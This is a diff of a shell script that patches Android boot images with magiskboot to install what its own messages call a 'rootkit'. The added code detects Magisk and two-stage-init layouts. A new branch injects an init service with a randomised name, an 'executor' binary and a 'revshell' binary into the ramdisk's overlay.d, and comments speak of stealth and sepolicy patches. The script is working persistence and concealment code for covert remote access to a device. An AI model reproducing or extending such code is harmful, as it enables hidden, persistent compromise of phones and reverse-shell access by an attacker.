@@ -39,6 +39,7 @@ if [ -z $SOURCEDMODE ]; then
 fi
 
 BOOTIMAGE="$1"
+SYSTEM_ROOT="$2"
 [ -e "$BOOTIMAGE" ] || abort "$BOOTIMAGE does not exist!"
 
 # Flags
@@ -75,7 +76,6 @@ esac
 # Ramdisk Restores
 ###################
 
-#SHA1=`./magiskboot sha1 "$BOOTIMAGE" 2>/dev/null`
 cat $BOOTIMAGE > stock_boot.img
 cp -af ramdisk.cpio ramdisk.cpio.orig 2>/dev/null
 
@@ -92,8 +92,24 @@ echo "RECOVERYMODE=$RECOVERYMODE" >> config
 ./magiskboot cpio ramdisk.cpio test
 STATUS=$?
 
-case $((STATUS & 3)) in
-  0 )  # Stock boot  /  Unsupported?
+if [ $((STATUS & 1)) -ne 0 ]; then
+  # unxz original init  (if xz)
+  ./magiskboot cpio ramdisk.cpio "extract .backup/init init"
+  ./magiskboot cpio ramdisk.cpio "extract .backup/init.xz init.xz" && \
+  ./magiskboot decompress init.xz init
+
+  # SAR device detected?   ->  count as 2si here
+  $SYSTEM_ROOT && STATUS=$((STATUS | 8))
+fi
+
+# TODO : legacy SAR + magisk ??
+
+#  1 = magisk
+#  2 = rootkit
+#  4 = compressed (ignore)
+#  8 = two-stage
+case $((STATUS & 11)) in
+  0|8 )  # Stock boot
     ui_print "- Stock boot image detected"
 
     ./magiskboot cpio ramdisk.cpio \
@@ -106,11 +122,6 @@ case $((STATUS & 3)) in
     ;;
   1 )  # Magisk patched
     ui_print "- Magisk patched boot image detected"
-
-    # unxz original init  (if xz)
-    ./magiskboot cpio ramdisk.cpio "extract .backup/init init"
-    ./magiskboot cpio ramdisk.cpio "extract .backup/init.xz init.xz" && \
-    ./magiskboot decompress init.xz init
 
     # Execute our patches after magisk to overwrite sepolicy (partial stealth?)
     #   upd:   still not working... magisk policy has priority?
@@ -132,25 +143,36 @@ case $((STATUS & 3)) in
     "add 750 .backup/init init" \
     "rm .backup/init.xz"
 
-    #  contains "selinux_setup" ?   ->  2si, too
-    ./magiskboot hexpatch init 73656c696e75785f7365747570 73656c696e75785f7365747570 && STATUS=8
-
-    if [ $((STATUS & 8)) -ne 0 ]; then
-      ui_print " "
-      ui_print "!    WARNING: Magisk in 2SI scheme detected."
-      ui_print "Full compatibility with Magisk is not yet implemented and tested. This tool will probably not work with Magisk installed."
-      ui_print " "
-    fi
-
     ;;
-  2|3 )
+  2|3|10 )  # Rootkit with / without magisk, except 2si magisk
     ui_print "- Rootkit installation detected, reinstalling"
 
-     ./magiskboot cpio ramdisk.cpio \
+    ./magiskboot cpio ramdisk.cpio \
     "add 000 .rtk_backup/.rtk config" \
     "add 750 init magiskinit"
 
     ;;
+  9|11 )  # 2si magisk (currently unsupported, so just use its overlay.d)
+          #  ->  no sepolicy patches, no stealth, use standard magisk context
+
+    ui_print " "
+    ui_print "!    Warning: Magisk in SAR / 2SI scheme detected."
+    ui_print "Due to compatibility issues, this tool will fallback to Magisk's own overlay.d and use standard magisk context."
+    ui_print " "
+
+    SVC_NAME=$(head /dev/urandom -c 60 | tail -c 40 | LC_ALL=C tr -dc A-Za-z0-9 | head -c 13)
+    printf "$(cat rtk.rc)" "$SVC_NAME" "$SVC_NAME" "$SVC_NAME" > rtk.rc
+
+    # Fallback to overlay.d (2si, works in newer magisk, limited stealth)
+    ./magiskboot cpio ramdisk.cpio \
+    "mkdir 000 overlay.d" \
+    "mkdir 000 overlay.d/sbin" \
+    "add 000 overlay.d/rtk.rc rtk.rc" \
+    "add 750 overlay.d/sbin/executor executor" \
+    "add 750 overlay.d/sbin/revshell revshell" \
+    "mkdir 000 .rtk_backup" \
+    "add 000 .rtk_backup/.rtk config"
+
 esac
 
 if [ $((STATUS & 4)) -ne 0 ]; then
